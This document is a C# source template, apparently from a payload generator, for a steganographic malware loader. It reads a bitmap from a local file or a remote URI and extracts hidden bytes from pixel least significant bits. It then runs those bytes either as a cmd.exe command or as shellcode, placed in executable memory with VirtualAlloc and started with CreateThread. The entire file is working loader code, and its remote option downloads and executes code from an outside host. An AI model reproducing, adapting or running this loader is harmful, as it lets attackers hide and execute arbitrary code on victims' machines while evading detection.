// #define payload_type_shellcode
// #define payload_type_cmd
#define payload_type_{{ payload_type }}



// #define delivery_method_remote
// #define delivery_method_local

#define delivery_method_{{ delivery_method }}


// #define payload_algorithm_lsb
// #define payload_algorithm_lsb_x

#define payload_algorithm_{{ payload_algorithm }}


using System.Drawing;
using System.Threading;




#if payload_type_shellcode
using System;
using System.Runtime.InteropServices;
#endif 

#if payload_type_cmd
using System.Diagnostics;
#endif



#if delivery_method_remote
using System.IO;
using System.Net;
#endif 





namespace csharp
{
    class Reader
    {
        const int shellcode_len = 46064; // {{ PAYLOAD_BITS }};
        static byte[] payload_data = new byte[shellcode_len / 8];

        static Bitmap bm;

        static void Main(string[] args)
        {
            load_image("{{ PAYLOAD_SOURCE }}");
            read_image();
            run();
            Thread.Sleep(3000);
        }





#if delivery_method_remote
        static void load_image(string file_uri)
        {
            WebClient client = new WebClient();
            Stream stream = client.OpenRead(file_uri);
            bm = new Bitmap(stream);
        }
#endif

#if delivery_method_local
        static void load_image(string filename)
        {
            bm = new Bitmap(filename);
        }
#endif






#if payload_type_cmd
        static void run() {
            string args = "/c " + System.Text.Encoding.UTF8.GetString(payload_data, 0, payload_data.Length);
            Process.Start("cmd.exe", args);
        }
#endif

#if payload_type_shellcode
        static void run() {
            IntPtr ptr = VirtualAlloc((IntPtr)0, shellcode_len / 8, 0x3000, 0x40);
            Marshal.Copy(payload_data, 0, (IntPtr)ptr, shellcode_len / 8);

            CreateThread(0, 0, ptr, (IntPtr)0, 0, 0);
        }

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            UInt32 dwSize,
            UInt32 flAllocationType,
            UInt32 flProtect
        );


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          IntPtr lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          UInt32 lpThreadId
          );
    
#endif






#if payload_algorithm_lsb
        static void read_image()
        {
            int length = shellcode_len;
            int pos = 0;

            for (int i = 0; i < bm.Height; i++)
            {
                for (int j = 0; j < bm.Width; j++)
                {
                    Color pixel_color = bm.GetPixel(j, i);

                    byte[] channels = {
                        pixel_color.R,
                        pixel_color.G,
                        pixel_color.B
                    };

                    foreach (byte channel in channels)
                    {
                        if (length <= 0)
                        {
                            return;
                        }

                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channel);
                        pos++;
                        length--;
                    }
                }
            }
        }

        static byte get_lsb(byte target, byte source)
        {
            return (byte)((target << 1) | (source & 1));
        }
#endif 
    }
}
